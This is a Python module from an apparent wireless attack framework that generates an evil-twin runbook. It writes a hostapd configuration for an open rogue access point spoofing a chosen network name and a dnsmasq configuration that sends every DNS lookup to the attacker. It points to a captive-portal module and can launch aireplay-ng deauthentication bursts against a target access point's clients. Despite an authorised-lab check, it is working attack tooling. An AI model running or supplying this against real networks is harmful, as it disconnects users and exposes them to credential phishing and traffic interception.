"""Emit an evil-twin lab runbook: hostapd + dnsmasq + optional deauth reference.

Does not auto-run daemons unless `launch_deauth_orchestrator` is true (spawns subprocess).

Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""

from __future__ import annotations

import shutil
import subprocess
from pathlib import Path

from wirelessxpl.core.exploit import *

from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab, warn_pmf_ios


class Exploit(Exploit):
    """Documented evil-twin workflow with optional stubs."""

    __info__ = {
        "name": "Evil twin lab runbook",
        "description": "Prints ordered steps and example hostapd/dnsmasq snippets; optional "
                       "call into aireplay-ng barrage helper binary.",
        "authors": ("André Henrique (@mrhenrike)",),
        "references": ("https://www.aircrack-ng.org/doku.php?id=airodump-ng",),
        "devices": ("Authorised isolated RF bench",),
    }

    target_bssid = OptString("", "Legitimate AP BSSID you mirror (lab only)")
    rogue_ssid = OptString("WXF-EvilTwin", "Spoofed ESSID")
    channel = OptInteger(6, "Channel to match target AP")
    ap_interface = OptString("", "AP mode interface for hostapd")
    mon_interface = OptString("", "Monitor iface for deauth (optional)")
    output_dir = OptString("./wxf_evil_twin_runbook", "Directory for generated snippets")
    launch_deauth_orchestrator = OptBool(
        False,
        "If true, exec aireplay-ng -0 bursts (needs mon_interface + target_bssid)",
        advanced=True,
    )
    deauth_packets = OptInteger(32, "Packets per aireplay -0 burst when launching")

    def run(self) -> None:
        require_authorised_lab()
        warn_pmf_ios()

        out = Path(str(self.output_dir).strip() or "./wxf_evil_twin_runbook").resolve()
        out.mkdir(parents=True, exist_ok=True)

        hostapd = "\n".join(
            [
                "driver=nl80211",
                "interface={}".format(self.ap_interface or "wlan0"),
                "ssid={}".format(self.rogue_ssid),
                "hw_mode=g",
                "channel={}".format(int(self.channel)),
                "auth_algs=1",
                "wmm_enabled=1",
                "wpa=0",
                "",
            ]
        )
        dnsmasq = "\n".join(
            [
                "interface={}".format(self.ap_interface or "wlan0"),
                "bind-interfaces",
                "dhcp-range=10.66.77.100,10.66.77.150,12h",
                "dhcp-option=3,10.66.77.1",
                "dhcp-option=6,10.66.77.1",
                "address=/#/10.66.77.1",
                "",
            ]
        )
        (out / "hostapd_evil_twin.conf").write_text(hostapd, encoding="utf-8")
        (out / "dnsmasq_evil_twin.conf").write_text(dnsmasq, encoding="utf-8")

        print_success("Wrote runbook to {}".format(out))
        print_status("1) Put {} in AP mode; assign IP 10.66.77.1/24 on AP iface.".format(self.ap_interface))
        print_status("2) hostapd {}".format(out / "hostapd_evil_twin.conf"))
        print_status("3) dnsmasq --conf-file={} --no-daemon".format(out / "dnsmasq_evil_twin.conf"))
        print_status("4) Start captive portal: use generic/wifi_lab/captive_portal_modern_lab on :80")
        print_status("5) Optional deauth: generic/wifi_lab/aireplay_deauth_barrage or mdk4_bridge")

        if self.launch_deauth_orchestrator and self.mon_interface and self.target_bssid:
            arp = shutil.which("aireplay-ng")
            if not arp:
                print_error("aireplay-ng missing.")
                return
            cmd = [
                arp,
                "-0",
                str(int(self.deauth_packets)),
                "-a",
                self.target_bssid,
                "-c",
                "FF:FF:FF:FF:FF:FF",
                self.mon_interface,
            ]
            print_status("Launching: {}".format(" ".join(cmd)))
            subprocess.run(cmd, check=False)
